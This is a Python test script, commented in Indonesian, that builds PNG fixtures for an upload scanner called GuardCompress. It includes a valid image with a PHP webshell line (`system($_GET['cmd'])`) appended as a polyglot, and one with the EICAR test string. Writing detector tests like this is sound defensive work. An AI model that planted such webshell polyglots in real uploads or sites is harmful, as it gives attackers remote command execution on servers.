"""Generate 3 fixture PNG untuk uji keamanan GuardCompress.
Usage: python gen-fixtures.py  (dari folder test/)
Output ke fixtures/ :
  clean.png     - PNG valid 8x8, bersih        -> harus CLEAN
  evil-php.png  - PNG valid + webshell <?php   -> harus BLOCKED
  evil-eicar.png- PNG valid + string EICAR     -> harus BLOCKED
"""
import struct
import zlib
from pathlib import Path

OUT = Path(__file__).resolve().parent / "fixtures"
OUT.mkdir(parents=True, exist_ok=True)


def chunk(ctype: bytes, data: bytes) -> bytes:
    c = ctype + data
    return struct.pack(">I", len(data)) + c + struct.pack(">I", zlib.crc32(c) & 0xFFFFFFFF)


def make_png(extra: bytes = b"") -> bytes:
    ihdr = struct.pack(">IIBBBBB", 8, 8, 8, 2, 0, 0, 0)  # 8x8 truecolor
    raw = b"".join(b"\x00" + b"\xff\x00\x00" * 8 for _ in range(8))  # merah
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", ihdr)
        + chunk(b"IDAT", zlib.compress(raw))
        + chunk(b"IEND", b"")
        + extra
    )


files = {
    "clean.png": make_png(),
    "evil-php.png": make_png(b'\n<?php system($_GET["cmd"]); // webshell polyglot\n?>'),
    "evil-eicar.png": make_png(
        b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    ),
}
for name, data in files.items():
    (OUT / name).write_bytes(data)
    print(f"{name}: {len(data)} bytes")
print("OK - 3 fixture dibuat di fixtures/")
